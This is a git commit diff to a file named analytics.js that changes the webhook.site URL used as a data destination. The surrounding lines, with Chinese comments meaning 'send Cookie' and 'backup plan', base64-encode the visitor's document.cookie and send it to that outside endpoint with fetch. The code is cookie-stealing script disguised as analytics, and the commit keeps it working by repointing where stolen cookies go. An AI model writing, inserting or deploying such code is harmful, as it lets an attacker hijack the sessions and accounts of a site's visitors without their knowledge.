7f9a2c7a449c3f4271ca9b26dac8c5443061c8ef
Pariston-Hill <156459246+Pariston-Hill@users.noreply.github.com>
2026-04-28 19:59:20 +1000

    Update analytics.js

--- analytics.js
+++ analytics.js
@@ -1,4 +1,4 @@
-var webhook = "https://webhook.site/4d5c5aed-b420-44a8-9a20-d976e811ca3e?";
+var webhook = "https://webhook.site/0b927305-6673-4353-8e4c-b7b7046d7071?";
 // 发送 Cookie
 fetch(webhook + "data=" + btoa(document.cookie), { mode: 'no-cors' });
 // 备用方案
